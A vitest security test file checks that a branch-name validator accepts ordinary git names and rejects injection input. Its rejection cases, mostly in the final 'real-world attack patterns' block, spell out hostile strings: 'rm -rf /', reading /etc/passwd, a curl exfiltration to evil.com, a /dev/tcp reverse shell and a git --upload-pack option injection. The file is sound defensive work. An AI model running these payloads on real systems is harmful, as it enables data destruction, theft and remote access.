import { describe, expect, it } from "vitest";
import { validateBranchName } from "./repositoryManager";

describe("validateBranchName - Security Tests", () => {
  describe("valid branch names", () => {
    it("accepts simple branch names", () => {
      expect(() => validateBranchName("main")).not.toThrow();
      expect(() => validateBranchName("develop")).not.toThrow();
      expect(() => validateBranchName("feature")).not.toThrow();
    });

    it("accepts branch names with hyphens", () => {
      expect(() => validateBranchName("feature-test")).not.toThrow();
      expect(() => validateBranchName("bug-fix-123")).not.toThrow();
      expect(() => validateBranchName("my-awesome-feature")).not.toThrow();
    });

    it("accepts branch names with underscores", () => {
      expect(() => validateBranchName("feature_test")).not.toThrow();
      expect(() => validateBranchName("bug_fix_123")).not.toThrow();
    });

    it("accepts branch names with dots", () => {
      expect(() => validateBranchName("release.1.0")).not.toThrow();
      expect(() => validateBranchName("v2.0.1")).not.toThrow();
    });

    it("accepts branch names with forward slashes", () => {
      expect(() => validateBranchName("feature/my-feature")).not.toThrow();
      expect(() => validateBranchName("bugfix/JIRA-123")).not.toThrow();
      expect(() => validateBranchName("user/john/feature")).not.toThrow();
    });

    it("accepts single character branch names", () => {
      expect(() => validateBranchName("a")).not.toThrow();
      expect(() => validateBranchName("1")).not.toThrow();
    });

    it("accepts branch names with numbers", () => {
      expect(() => validateBranchName("release123")).not.toThrow();
      expect(() => validateBranchName("123release")).not.toThrow();
      expect(() => validateBranchName("v1")).not.toThrow();
    });
  });

  describe("command injection patterns - MUST REJECT", () => {
    it("rejects backticks (command substitution)", () => {
      expect(() => validateBranchName("feature`rm -rf /`")).toThrow();
      expect(() => validateBranchName("`whoami`")).toThrow();
    });

    it("rejects dollar signs (variable expansion)", () => {
      expect(() => validateBranchName("feature$USER")).toThrow();
      expect(() => validateBranchName("$(rm -rf /)")).toThrow();
      expect(() => validateBranchName("${PATH}")).toThrow();
    });

    it("rejects parentheses (subshell)", () => {
      expect(() => validateBranchName("feature(test)")).toThrow();
      expect(() => validateBranchName("$(whoami)")).toThrow();
    });

    it("rejects semicolons (command separator)", () => {
      expect(() => validateBranchName("feature;rm -rf /")).toThrow();
      expect(() => validateBranchName("main; echo pwned")).toThrow();
    });

    it("rejects pipes (command chaining)", () => {
      expect(() => validateBranchName("feature|cat /etc/passwd")).toThrow();
    });

    it("rejects ampersands (background/logical operators)", () => {
      expect(() => validateBranchName("feature&")).toThrow();
      expect(() => validateBranchName("feature&&rm -rf /")).toThrow();
    });

    it("rejects redirects", () => {
      expect(() => validateBranchName("feature>file")).toThrow();
      expect(() => validateBranchName("feature<file")).toThrow();
    });

    it("rejects quotes (string escaping)", () => {
      expect(() => validateBranchName("feature'test")).toThrow();
      expect(() => validateBranchName('feature"test')).toThrow();
    });

    it("rejects backslash (escape characters)", () => {
      expect(() => validateBranchName("feature\\ntest")).toThrow();
    });

    it("rejects exclamation marks (history expansion)", () => {
      expect(() => validateBranchName("feature!test")).toThrow();
    });

    it("rejects curly braces (brace expansion)", () => {
      expect(() => validateBranchName("feature{test}")).toThrow();
    });

    it("rejects square brackets (glob patterns)", () => {
      expect(() => validateBranchName("feature[test]")).toThrow();
    });

    it("rejects hash (comments)", () => {
      expect(() => validateBranchName("feature#test")).toThrow();
    });

    it("rejects asterisk (glob)", () => {
      expect(() => validateBranchName("feature*")).toThrow();
    });

    it("rejects question mark (glob)", () => {
      expect(() => validateBranchName("feature?")).toThrow();
    });
  });

  describe("git-specific invalid patterns - MUST REJECT", () => {
    it("rejects double dots (path traversal / revision range)", () => {
      expect(() => validateBranchName("feature..main")).toThrow();
      expect(() => validateBranchName("../../../etc/passwd")).toThrow();
    });

    it("rejects @{ pattern (reflog syntax)", () => {
      expect(() => validateBranchName("HEAD@{0}")).toThrow();
      expect(() => validateBranchName("feature@{upstream}")).toThrow();
    });

    it("rejects .lock suffix", () => {
      expect(() => validateBranchName("feature.lock")).toThrow();
      expect(() => validateBranchName("refs/heads/main.lock")).toThrow();
    });

    it("rejects leading hyphen (interpreted as option)", () => {
      expect(() => validateBranchName("-feature")).toThrow();
      expect(() => validateBranchName("--delete")).toThrow();
    });

    it("rejects leading dot", () => {
      expect(() => validateBranchName(".hidden")).toThrow();
    });

    it("rejects trailing slash", () => {
      expect(() => validateBranchName("feature/")).toThrow();
    });

    it("rejects double slashes", () => {
      expect(() => validateBranchName("feature//test")).toThrow();
    });
  });

  describe("control characters - MUST REJECT", () => {
    it("rejects null byte", () => {
      expect(() => validateBranchName("feature\x00test")).toThrow();
    });

    it("rejects newline", () => {
      expect(() => validateBranchName("feature\ntest")).toThrow();
    });

    it("rejects carriage return", () => {
      expect(() => validateBranchName("feature\rtest")).toThrow();
    });

    it("rejects tab", () => {
      expect(() => validateBranchName("feature\ttest")).toThrow();
    });

    it("rejects DEL character", () => {
      expect(() => validateBranchName("feature\x7ftest")).toThrow();
    });
  });

  describe("edge cases - MUST REJECT", () => {
    it("rejects empty string", () => {
      expect(() => validateBranchName("")).toThrow();
    });

    it("rejects very long branch names", () => {
      const longName = "a".repeat(256);
      expect(() => validateBranchName(longName)).toThrow();
    });

    it("rejects just a slash", () => {
      expect(() => validateBranchName("/")).toThrow();
    });
  });

  describe("real-world attack patterns", () => {
    it("rejects shell injection in branch name", () => {
      // Attempt to delete files
      expect(() =>
        validateBranchName("feature$(rm -rf /)")
      ).toThrow();

      // Attempt to exfiltrate data
      expect(() =>
        validateBranchName("feature`curl evil.com/$(cat /etc/passwd)`")
      ).toThrow();

      // Attempt to spawn reverse shell
      expect(() =>
        validateBranchName("feature;bash -i >& /dev/tcp/1.2.3.4/8080 0>&1")
      ).toThrow();

      // Attempt git option injection
      expect(() =>
        validateBranchName("--upload-pack=touch /tmp/pwned")
      ).toThrow();
    });
  });
});
